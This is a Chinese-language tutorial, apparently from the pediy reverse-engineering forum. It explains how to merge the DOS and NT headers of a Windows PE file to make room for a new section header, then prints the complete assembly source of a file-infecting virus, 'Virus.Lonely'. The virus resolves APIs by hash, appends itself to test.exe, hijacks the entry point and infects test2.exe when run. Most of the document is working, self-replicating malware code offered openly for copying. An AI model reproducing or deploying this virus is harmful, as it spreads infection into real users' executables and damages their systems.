
# 1.4 - 1. 变形 PE 头添加节形式感染

> 原文：[`www.pediy.com/kssd/pediy10/89403.html`](https://www.pediy.com/kssd/pediy10/89403.html)

## 1. 变形 PE 头添加节形式感染

很抱歉最近出了趟远门，昨天星期 2 才回来，今天下午给大家更新下文章。

**前言：**

今天我们讲的主题是“变形 PE 头添加节形式感染”。因为大部分的添加节过程，在对节表结构尾部空隙不够写入一个新的节表结构时，都处理的不是很恰当。今天我来给大家带来一种思路，通过变形 PE 头来让我们有足够的空隙写入一个新的节表结构。

### 1. 变形 PE 头原理

这里的变形 PE 头的思路是用的比较方便的方法，就是将结构融合起来。聪明的你是否已经想到了？就是将 `IMAGE_DOS_HEADER` 和 `IMAGE_NT_HEADER` 结构融合到一起。因为我们都知 `IMAGE_DOS_HEADER` 和 `IMAGE_NT_HEADER` 的结构成员很多我们是用不到的，所以我们可以按照相应的结构排列，把这些无用的结构成员，融合到一起后，替换成一些有用的成员。是不是很绕？没关系，我们继续往下看。

一般我们都知道 `IMAGE_DOS_HEADER` 结构只有两个成员针对 PE LOADER 是有用的。(1). `e_magic` (2). `e_lfanew`。其他的成员 PE LOADER 一般是用不到的。但是我们必须要知道的是 `e_lfanew` 成员我们必须保证它是基于 `IMAGE_DOS_HEADER` 的 `3ch` 偏移处。了解了以上，我们知道我们一个新的节表结构的大小是 40 字节，那么一个 `IMAGE_DOS_HEADER` 结构是 64 字节，那么我们 `IMAGE_DOS_HEADER` 和 `IMAGE_NT_HEADER` 融合。空余出来的字节大小肯定是够我们写入一个新的节表结构的，而且我们这里计算还没有加上如果对方的程序存在 DOS STUB 以及节表结构尾部还存在一些空隙，呵呵这对我们写入一个新的节表结构是足足有余的。

我们如何融合 `IMAGE_DOS_HEADER` 和 `IMAGE_NT_HEADER` 呢？

首先我们需要找一个 `IMAGE_NT_HEADER` 结构中的一个不常用的成员，把它排列使其这个无用的成员基于 `IMAGE_DOS_HEADER` 结构偏移为 `3ch`，恩没错就是把这个成员替换成 `e_lfanew`。我们尽量找 `IMAGE_OPTIONAL_HEADER` 中的成员，这样我们扩展剩余的字节空间就会更多。

我们这里用 `IMAGE_OPTIONAL_HEADER` 结构中的 `BaseOfData` 成员，因为这个成员一般对于我们来说没什么用处。这个成员在 `IMAGE_NT_HEADER` 的偏移是 `30h`。那么我们只要将他排列使其这个成员基于 `IMAGE_DOS_HEADER` 的结构是 `3ch`。那么我们是不是在 `IMAGE_NT_HEADER` 前补 12 个字节，这样我们把这 12 个字节所处的偏移看作为 `IMAGE_DOS_HEADER` 结构的偏移，这样我们的 `BaseOfData` 成员对于 `IMAGE_DOS_HEADER` 结构的偏移则为 `3c`，然后我们刚刚说了，我们的 `IMAGE_DOS_HEADER` 重要的是(1). `e_magic` (2). `e_lfanew`。所以我们将前 12 个字节中的前两个字节写入 `'MZ'`，然后将 `BaseOfData` 中的偏移写入 `0ch`。这样我们就成功的将 `IMAGE_DOS_HEADER` 和 `IMAGE_NT_HEADER` 融合到一起了。

给大家一个更直观的感受，我们看下变形后 PE 头结构部分成员排布的情况。如下图

![](img/3289cc9f46113e40f8c2b5979ba6c717.jpg)

## 2. 变形 PE 头添加节实现过程

当然我们的添加节过程是要在宿主程序的节表结构尾部空隙不够写入一个新的节表结构时变形 PE 头然后写入节表结构，所以我们要判断下。这里给出一个我实现后的过程。

**代码：**

```asm
;++
;
; int
;   AddSectionTable(
;    pByte pMemory
;    DWORD dwLen
;   )
;
; Routine Description:
;
;    变形 PE 头添加节函数
;
; Arguments:
;
;   (esp)   - return address
;
;   [esp+4*8+4*1] - pMemory
;
;   [esp+4*8+4*2] - dwLen
;
; Return Value:
;
;    eax = New Section PhysicalOffset, 0
;    edx = New Section VirtualOffset
;   
;--
 
AddSectionTable:
   pushad
   mov  ebx, [esp+4*8+4*1]
   mov  esi, ebx
   add  esi, [esi+3ch]
   
   ;++ 
   ; edi = Section Table
   movzx  ecx, word [esi+IMAGE_FILE_HEADER.SizeOfOptionalHeader+4]
   lea  edi, dword [esi+ecx+4+sizeof.IMAGE_FILE_HEADER]
   ;--
   
   ;++
   ; Clear Bound Import Entry
   lea  edx, [esi+74h]
   cmp  dword [edx], 10h
   jl  .GoSectionTable
   mov  dword [edx+4+11*8], 0 
   ;--
   
  .GoSectionTable:
   ;++ 
   ; edx = First Section Offset 
   ; edi = Last  Section Table Offset
   mov  edx, [edi+IMAGE_SECTION_HEADER.PointerToRawData]
   add  edx, ebx
   movzx  ecx, word [esi+IMAGE_FILE_HEADER.NumberOfSections+4]
   imul  ecx, ecx, sizeof.IMAGE_SECTION_HEADER
   add  edi, ecx
   ;-- 
   
   ;++ 
   ; Expand PE Header Struct
   ; BaseOfData equ .lfanew
   push  edx
   mov  eax, edi
   sub  edx, eax
   cmp  edx, sizeof.IMAGE_SECTION_HEADER
   pop  edx
   jge  .AddSectionTable
   
   ; Test Expand Is Exist
   cmp  word [ebx+0ch], 'PE'
   jnz  .Expand
   xor  eax, eax
   mov  [esp+pushad_eax], eax
   jmp  .Result
   
  .Expand:
   sub  eax, esi
   xchg  eax, ecx
   pushad
   lea  edi, [ebx+0ch]
   mov  dword [esp+pushad_esi], edi 
   cld
   rep  movsb
   mov  dword [esp+pushad_edi], edi
   
   sub  edx, edi
   xchg  ecx, edx
   xor  eax, eax
   rep  stosb
   popad
   
   mov  dword [ebx+3ch], 0ch
   ;--
   
  .AddSectionTable:
   ; Inc    Num
   inc  word [esi+06h]
   
   ; Sectio Name
   mov  dword [edi], '.xfi'
   mov  word [edi+4], 'sh'
   
  ; Physical size
  push  dword [esp+4*8+4*2]
  pop  dword [edi+10h]
   
  ; Physical offset
  lea  edx, [edi-28h]
   mov  eax, [edx+14h]
   mov  ecx, [edx+10h]
   add  eax, ecx
   mov  dword [edi+14h], eax
   mov  dword [esp+pushad_eax], eax
   
   ; Virtual size
   push  dword [esp+4*8+4*2]
  pop  dword [edi+8h]
   
  ; Virtual offset 
  push  dword [esi+50h]
  pop  eax
  mov  dword [edi+0ch], eax
  mov  [esp+pushad_edx], eax
   
   ; Flags
  mov  dword [edi+24h], 0E0000020h
   
   ; SizeOfImage
   mov  ecx, [edi+08h]
   add  ecx, [edi+0ch]
   mov  dword [esi+50h], ecx
   
  .Result:
   popad
   retn  4*2
```

那么我们今天这篇文章的主题是变形 PE 头添加节形式感染，那么我们当然少不了感染过程了。添加节感染，我想我就不用太多重复了，因为普通的添加节文章太多太多了。所以这里我直接给出一段利用变形 PE 头添加节感染的代码 Demo，这段 Demo 代码程序运行后会感染当前目录下的 `test.exe`，感染后的程序会在运行的时候会继续感染当前目录的 `test2.exe` 并有一个消息框提示给用户，由于是一个 Demo，所以没有做全盘感染以及感染标记。

大家可以随便 copy 一个文件到此病毒程序的当前目录下为 `test.exe` 来做测试。

**代码：**



```
;+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;
;  Virus.Lonely  By: xfish
;     
;  (c)2009-05-20   
;      --- Lonely xfish.  Email: AntiAntiWorm@Gmail.com
;      --- thanks 29a, pediy, hacker.com.cn 
;-----------------------------------------------------------------------------

  format PE GUI 4.0
  include 'win32ax.inc'
  entry  Virus\_Entry
  

section '.Lonely' code readable writeable executable

 Virus\_Entry:
  pushad
 call  Dels
 int  3
 int  3
 int  3
 Dels:
 pop  ebp
 sub  ebp, Dels-2*3
  
 ; kernel32
 call  GetKrnlBase
  
 lea  edi, [ebp+dwFunc]
 push  edi
 push  eax
 call  GetFuncAddress
  
 @pushsz  'user32'
 call  [edi + _LoadLibray-dwFunc]
  
 push  edi
 push  eax
 call  GetFuncAddress
  
 test  ebp, ebp
 jz  .Inject
  
 push  0
 @pushsz  'Virus Demo'
 @pushsz  'by:xfish http://www.pediy.com http://www.hacker.com.cn'
 push  0
 call  [edi + _MessageBox-dwFunc]
  
 push  dword [ebp+JmpHost+1]
 pop  dword [esp+pushad\_eax]
  
 @pushsz  'test2.exe'
 call  Inject
 popad
  
 push  eax
 retn
  
 .Inject:
 @pushsz  'test.exe'
 call  Inject
 popad
 retn


 ;++
 ;
 ; int
 ;   GetKrnlBase(
 ;    void
 ;   )
 ;
 ; Routine Description:
 ;
 ;    获得 kernel32 基地址
 ;
 ; Arguments:
 ;
 ;    (esp)         - return address
 ;
 ;
 ; Return Value:
 ;
 ;    eax =  krnlbase
 ;
 ;--
 GetKrnlBase:
   sub  eax, eax
   mov  eax, [fs:eax+30h]
   test  eax, eax
   js  .Os9x
  mov  eax, [eax+0ch]
  mov  eax, [eax+1ch]
  mov  eax, [eax]
 mov  eax, [eax+8h]
 jmp  .Result
 .Os9x:
   mov   eax, [eax+34h]
  lea   eax, [eax+7ch]
  mov   eax, [eax+3ch]
 .Result:
   retn
   

 ;++
 ;
 ; int
 ;   GetFuncAddress
 ;    int hModule,
 ;    int pHashStringList
 ;   )
 ;
 ; Routine Description:
 ;
 ;   获取 Hash API 地址
 ;
 ; Arguments:
 ;
 ;    (esp)         - return address
 ;    (esp+4*8+4)    - hModule
 ;    (esp+4*8+8)    - pHashStringList
 ;
 ; Return Value:
 ;
 ;    nothing
 ;
 ;--
 GetFuncAddress:
 pushad
 mov  ebx, [esp+4*8+4]   
 mov  edx, [ebx+3ch]     
 mov  esi, [ebx++edx+78h]   
 lea  esi, [esi+ebx+18h]   
 lodsd
 xchg  eax, ecx
 lodsd
 add  eax, ebx
 xchg  eax, ebp     
 lodsd
 add  eax, ebx     
 xchg  eax, edx     
 lodsd
 add  eax, ebx
 push  eax       
 
 mov  esi, edx
 .Next\_Func:
  lodsd
  add  eax, ebx
   
  ; Make Func Hash
  xor     edx, edx
 .Make\_Hash:
   rol  edx, 3
   xor     dl, byte [eax]
 inc     eax
 cmp     byte [eax], 0
 jnz  .Make\_Hash
  
 mov     eax, [esp]
 add  dword [esp], 2

 mov  edi, [esp+4*8+8+4]
 .Scan\_Dw\_Funcs:
 cmp  dword [edi], edx
 jnz  .Next\_List
  
 movzx  eax, word [eax]
 mov  eax, [ebp+eax*4]
 add  eax, ebx
 scasd
 stosd
 jmp  .Ret
   
 .Next\_List:
 scasd
 scasd
 cmp  dword [edi], 0
 jne  .Scan\_Dw\_Funcs
 .Ret:
 loop   .Next\_Func
 pop  ecx
 popad
 retn   4*2
   

 ;++
 ;
 ; CF
 ;   IsPe(
 ;    pByte pMemory
 ;   )
 ;
 ; Routine Description:
 ;
 ;    测试是否是 PE 文件
 ;
 ; Arguments:
 ;
 ;   (esp)   - return address
 ;
 ;   [esp+4] - pMemory
 ;
 ; Return Value:
 ;
 ;    eax -- NewSection Physical offset
 ;    eax -- 0
 ;--
 
 IsPe:
  mov  edx, [esp+4]
  cmp  word [edx], 'MZ'
  jnz  .RetFalse
  add  edx, [edx+3ch]
  cmp  word [edx], 'PE'
  jnz  .RetFalse
   
 .RetTrue:   
  stc
  retn  4*1
   
 .RetFalse:
  clc
  retn  4*1

 ;++
 ;
 ; CF
 ;   IsFileType(
 ;    LPCTSTR lpFileName
 ;   )
 ;
 ; Routine Description:
 ;
 ;    测试文件类型是否是 32 位二进制文件
 ;
 ; Arguments:
 ;
 ;   (esp)   - return address
 ;
 ;   [esp+4] - lpFileName
 ;
 ; Return Value:
 ;
 ;    CF -- 1, = TRUE.
 ;
 ;--
 
 IsFileType:
  push  0
  push  esp
  push  dword [esp+4*2+4]
  call  dword [ebp + _GetBinaryType]
  pop  eax
  ; 32BIT\_BINARY = 0
  test  eax, eax
  jne  .RetFalse
   
 .RetTrue:
  stc
  retn  4*1
   
 .RetFalse:
  clc
  retn  4*1

 ;++
 ;
 ; void
 ;   Inject(
 ;    LPCTSTR lpFileName
 ;   )
 ;
 ; Routine Description:
 ;
 ;    感染文件
 ;
 ; Arguments:
 ;
 ;   (esp)   - return address
 ;
 ;   [esp+4] - lpFileName
 ;
 ; Return Value:
 ;
 ;    nothing
 ;
 ;--
 
 Inject:
  pushad
  mov  esi, [esp+4*8+4*1]
   
  ;++
  ; Is File Pe Format
  push  esi
  call  IsFileType
  jnc  .Result
  ;--
   
  sub  eax, eax
  push  eax
  push  eax
  push  OPEN\_EXISTING
  push  eax
  push  FILE\_SHARE\_WRITE
  push  GENERIC\_READ or GENERIC\_WRITE
  push  esi
  call  [ebp + _CreateFile]
  cmp  eax, -1
  jz  .Result
   
  xchg  eax, ebx
   
  push  0
  push  ebx
  call  [ebp + _GetFileSize]
   
  push  eax
  ;
  push  PAGE\_READWRITE
  push  MEM\_COMMIT
  push  eax
  push  0
  call  [ebp + _VirtualAlloc]
  ;
  pop  edx
  test  eax, eax
  jz  .CloseHandle
   
  xchg  eax, edi
  mov  dword [ebp + .FreeSize], edx
   
  push  0
  push  esp
  push  dword [ebp + .FreeSize]
  push  edi
  push  ebx
  call  [ebp + _ReadFile]
  test  eax, eax
 jz  .FreeMem
   
  push  edi
  call  IsPe
  jnc  .FreeMem
   
  push  Virus\_Len
  push  edi
  call  AddSectionTable
  test  eax, eax
  jz  .FreeMem
   
  ;++ Update Oep, Write JmpHost 
 mov  eax, edi
 add  eax, [eax+3ch]
 mov  ecx, edx
 xchg  ecx, [eax+28h]
 add  ecx, [eax+34h]
 mov  dword [ebp + JmpHost+1], ecx
 ;--
   
 push  FILE\_BEGIN
 push  0
 push  0
 push  ebx
 call  [ebp+ _SetFilePointer]
  
 push  0
 push  esp
 lea  eax, [ebp + .FreeSize]
 push  dword [eax]
 push  edi
 push  ebx
 call  [ebp + _WriteFile]
 test  eax, eax
 jz  .FreeMem
  
 push  FILE\_END
 push  0
 push  Virus\_Len
 push  ebx
 call  [ebp + _SetFilePointer]
  
 push  ebx
 call  [ebp + _SetEndOfFile]
  
  
 push  FILE\_CURRENT
 push  0
 push  -(Virus\_Len)
 push  ebx
 call  [ebp + _SetFilePointer]
  
 push  0
 push  esp
 push  Virus\_Len
 lea  eax, [ebp + Virus\_Entry]
 push  eax
 push  ebx
 call  [ebp + _WriteFile]
 test  eax, eax
 jz  .FreeMem
  
 .FreeMem:
 push  MEM\_DECOMMIT
       .FreeSize = $ + 1
 push  $
 push  edi
 call  [ebp + _VirtualFree]
  
 .CloseHandle:
   push  ebx
   call  [ebp + _CloseHandle]   
   
 .Result:
 popad
 retn  4*1


 ;++
 ;
 ; int
 ;   AddSectionTable(
 ;    pByte pMemory
 ;    DWORD dwLen
 ;   )
 ;
 ; Routine Description:
 ;
 ;    添加节函数
 ;
 ; Arguments:
 ;
 ;   (esp)   - return address
 ;
 ;   [esp+4*8+4*1] - pMemory
 ;
 ;   [esp+4*8+4*2] - dwLen
 ;
 ; Return Value:
 ;
 ;    eax = New Section PhysicalOffset, 0
 ;    edx = New Section VirtualOffset
 ;   
 ;--
 
 AddSectionTable:
  pushad
  mov  ebx, [esp+4*8+4*1]
  mov  esi, ebx
  add  esi, [esi+3ch]
   
  ;++ 
  ; edi = Section Table
  movzx  ecx, word [esi+IMAGE\_FILE\_HEADER.SizeOfOptionalHeader+4]
  lea  edi, dword [esi+ecx+4+sizeof.IMAGE\_FILE\_HEADER]
  ;--
   
  ;++
  ; Clear Bound Import Entry
  lea  edx, [esi+74h]
  cmp  dword [edx], 10h
  jl  .GoSectionTable
  mov  dword [edx+4+11*8], 0 
  ;--
   
 .GoSectionTable:
  ;++ 
  ; edx = First Section Offset 
  ; edi = Last  Section Table Offset
  mov  edx, [edi+IMAGE\_SECTION\_HEADER.PointerToRawData]
  add  edx, ebx
  movzx  ecx, word [esi+IMAGE\_FILE\_HEADER.NumberOfSections+4]
  imul  ecx, ecx, sizeof.IMAGE\_SECTION\_HEADER
  add  edi, ecx
  ;-- 
   
  ;++ 
  ; Expand PE Header Struct
  ; BaseOfData equ .lfanew
  push  edx
  mov  eax, edi
  sub  edx, eax
  cmp  edx, sizeof.IMAGE\_SECTION\_HEADER
  pop  edx
  jge  .AddSectionTable
   
  ; Test Expand Is Exist
  cmp  word [ebx+0ch], 'PE'
  jnz  .Expand
  xor  eax, eax
  mov  [esp+pushad\_eax], eax
  jmp  .Result
   
 .Expand:
  sub  eax, esi
  xchg  eax, ecx
  pushad
  lea  edi, [ebx+0ch]
  mov  dword [esp+pushad\_esi], edi 
  cld
  rep  movsb
  mov  dword [esp+pushad\_edi], edi
   
  sub  edx, edi
  xchg  ecx, edx
  xor  eax, eax
  rep  stosb
  popad
   
  mov  dword [ebx+3ch], 0ch
  ;--
   
 .AddSectionTable:
  ; Inc    Num
  inc  word [esi+06h]
   
  ; Sectio Name
  mov  dword [edi], '.xfi'
  mov  word [edi+4], 'sh'
   
 ; Physical size
 push  dword [esp+4*8+4*2]
 pop  dword [edi+10h]
  
 ; Physical offset
 lea  edx, [edi-28h]
  
 mov  eax, [edx+14h]
  
 mov  ecx, [edx+10h]
  
 add  eax, ecx
 mov  dword [edi+14h], eax
 mov  dword [esp+pushad\_eax], eax
   
  ; Virtual size
  push  dword [esp+4*8+4*2]
 pop  dword [edi+8h]
  
 ; Virtual offset 
 push  dword [esi+50h]
 pop  eax
 mov  dword [edi+0ch], eax
 mov  [esp+pushad\_edx], eax
  
  
  ; Flags
 mov  dword [edi+24h], 0E0000020h
   
  ; SizeOfImage
  mov  ecx, [edi+08h]
  add  ecx, [edi+0ch]
  mov  dword [esi+50h], ecx
   
 .Result:
 popad
 retn  4*2
   

 ;++
 JmpHost:
  push  $
  retn
 ;--
   
 ;+++++++++++++++++++++++++++++++++++++++++++++++++
 dwFunc:
       dd  0C0D6D616h
   _CloseHandle   dd  0
   
       dd  038C62A7Ah
   _CreateFile   dd  0
   
       dd  0ABD10842h
   _GetBinaryType   dd  0
   
       dd  09554EFE7h
   _GetFileSize   dd  0
   
       dd  00BE25545h
   _ReadFile   dd  0
   
       dd  0A97175F9h
   _SetEndOfFile   dd  0
   
       dd  0A9D1FD70h
   _SetFilePointer   dd  0
         
         dd  0AB16D0AEh
   _VirtualAlloc   dd  0
   
       dd  0B562D3DBh
   _VirtualFree   dd  0
   
       dd  058D8C545h
   _WriteFile   dd  0
   
       dd  0A412FD89h
   _LoadLibray   dd  0
   
       dd  014D14C51h
   _MessageBox   dd  0
 ;-------------------------------------------------

 Virus\_Len = $ - Virus\_Entry
```



上传的附件

| `![](img/c8c74a380a3dea7fa2460187d80ee5e0.jpg)` || `src.rar` [解压密码：`pediy`] |
